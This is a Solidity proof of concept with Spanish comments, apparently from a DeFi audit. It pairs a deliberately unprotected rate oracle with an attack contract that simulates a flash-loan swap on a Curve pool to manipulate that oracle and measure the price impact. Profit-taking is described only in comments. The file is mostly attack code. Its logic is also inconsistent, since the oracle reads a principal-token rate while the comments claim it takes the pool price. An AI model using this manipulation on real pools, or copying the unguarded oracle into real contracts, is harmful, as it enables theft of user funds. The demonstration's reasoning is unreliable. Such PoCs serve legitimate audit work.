// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.29;

// Importamos solo lo esencial para la prueba
interface IStableSwapNG {
    function coins(uint256 i) external view returns (address);
    function price_oracle(uint256 i) external view returns (uint256);
    function exchange(uint256 i, uint256 j, uint256 dx, uint256 min_dy) external returns (uint256);
}

interface IPrincipalToken {
    function getPTRate() external view returns (uint256);
    function maturity() external view returns (uint256);
    function fromRay(uint256 ray, uint256 decimals) external pure returns (uint256);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

// Contrato simplificado para demostrar la vulnerabilidad
contract VulnerableRateOracle {
    address public curvePoolAddress;
    uint256 public initialPrice;
    uint256 public startTime;
    uint256 public expiry;
    
    // Constructor para inicialización
    constructor(address _curvePoolAddress, uint256 _initialPrice) {
        curvePoolAddress = _curvePoolAddress;
        initialPrice = _initialPrice;
        startTime = block.timestamp;
        expiry = block.timestamp + 365 days;
    }
    
    // Función vulnerable
    function value() public view returns (uint256 rate) {
        // Aquí está la vulnerabilidad: obtiene el precio directamente sin ninguna protección
        uint256 futurePTValue = IPrincipalToken(
            IStableSwapNG(curvePoolAddress).coins(1)
        ).getPTRate();
        
        // El cálculo del factor de ajuste es irrelevante para la demostración
        // Lo importante es que usa futurePTValue tal cual viene del pool
        return futurePTValue;
    }
}

// Contrato para demostrar el ataque de manipulación
contract OracleManipulationAttack {
    VulnerableRateOracle public oracle;
    address public curvePool;
    address public ibt; // Interest Bearing Token
    address public pt;  // Principal Token
    
    uint256 public normalOracleValue;
    uint256 public manipulatedOracleValue;
    
    // Constructor
    constructor(address _curvePool) {
        curvePool = _curvePool;
        // Obtener direcciones de tokens
        ibt = IStableSwapNG(curvePool).coins(0);
        pt = IStableSwapNG(curvePool).coins(1);
        
        // Crear el oráculo vulnerable
        oracle = new VulnerableRateOracle(curvePool, 0.95e18);
    }
    
    // Función para registrar el valor normal del oráculo
    function recordNormalValue() external returns (uint256) {
        normalOracleValue = oracle.value();
        return normalOracleValue;
    }
    
    // Función que simula un ataque con flash loan
    function simulateFlashLoanAttack(uint256 flashLoanAmount) external returns (uint256) {
        // En un escenario real, esto sería un flash loan
        // Para la prueba, asumimos que tenemos los fondos
        
        // 1. Aprobamos el gasto del token IBT al pool
        IERC20(ibt).approve(curvePool, flashLoanAmount);
        
        // 2. Ejecutamos un swap grande para manipular el precio
        // Compramos PT con IBT, lo que aumentará el precio del PT
        IStableSwapNG(curvePool).exchange(0, 1, flashLoanAmount, 0);
        
        // 3. Ahora que el precio está manipulado, consultamos el oráculo
        manipulatedOracleValue = oracle.value();
        
        // 4. En un ataque real, aquí realizaríamos una operación que se beneficie
        // de este precio manipulado, y luego devolveríamos el flash loan
        
        // 5. Finalmente, realizaríamos la operación inversa para revertir 
        // la manipulación y obtener beneficios arbitraje
        
        return manipulatedOracleValue;
    }
    
    // Función para calcular el impacto porcentual de la manipulación
    function calculateImpact() external view returns (uint256) {
        if (normalOracleValue == 0) return 0;
        
        // Calcular la diferencia porcentual
        if (manipulatedOracleValue > normalOracleValue) {
            return ((manipulatedOracleValue - normalOracleValue) * 100) / normalOracleValue;
        } else {
            return ((normalOracleValue - manipulatedOracleValue) * 100) / normalOracleValue;
        }
    }
}
